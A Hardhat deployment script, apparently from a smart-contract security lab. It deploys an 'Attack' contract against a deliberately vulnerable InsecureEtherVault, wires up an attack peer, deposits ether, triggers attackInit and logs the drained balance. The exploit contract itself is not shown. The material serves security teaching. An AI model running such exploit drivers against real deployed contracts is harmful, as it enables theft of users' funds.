import { ethers } from "hardhat";

import addressBook from "./addressBook.json";
import { readFileSync, writeFileSync } from "fs";
import { join } from "path";
import { parseEther } from "ethers/src.ts/utils";
import { Attack__factory } from "../typechain-types";
async function main() {
  //* Read File
  const addressBookData = readFileSync(join(__dirname, "addressBook.json"));
  const addressBook = JSON.parse(addressBookData.toString());
  const etherVault = await ethers.getContractAt(
    "InsecureEtherVault",
    addressBook["InsecureEtherVault"]
  );
  const attackFactory: Attack__factory = await ethers.getContractFactory(
    "Attack"
  );

  const attack = await attackFactory.deploy(addressBook["InsecureEtherVault"]);
  await attack.setAttackPeer(addressBook["attackPeer"]);

  addressBook.attacker = attack.address;
  const peerAttackerAddress = addressBook.attackPeer;
  const peerAttacker = await ethers.getContractAt(
    "Attack",
    peerAttackerAddress
  );
  await etherVault.deposit({
    value: ethers.utils.parseEther("1"),
  });
  //* attack ethervault
  await attack.attackInit({
    value: ethers.utils.parseEther("1"),
  });
  console.log("결과 확인");
  console.log(
    (await etherVault.getUserBalance(peerAttackerAddress)).toString()
  );
  //await peerAttacker.attackNext();

  //* write file
  writeFileSync(
    join(__dirname, "addressBook.json"),
    JSON.stringify(addressBook, null, 2)
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
